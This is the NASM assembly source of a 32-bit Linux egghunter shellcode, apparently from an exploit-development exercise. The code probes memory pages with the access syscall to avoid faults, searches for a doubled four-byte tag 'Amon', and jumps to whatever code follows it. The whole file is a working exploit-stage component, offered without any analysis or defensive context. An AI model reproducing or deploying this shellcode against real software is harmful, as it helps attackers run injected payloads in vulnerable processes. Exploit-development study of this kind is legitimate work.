global _start

section .text
_start:
	cld
	xor ecx, ecx
	xor edx, edx

inc_page:
	or dx, 0xfff

inc_one:
	inc edx

check:
	lea ebx, [edx+0x4]
	push byte 0x21
	pop eax
	int 0x80
	cmp al, 0xf2
	jz inc_page

is_egg:
	mov eax, 0x416d6f6e ; Amon
	mov edi, edx
	scasd
	jnz inc_one
	scasd
	jnz inc_one

matched:
	jmp edi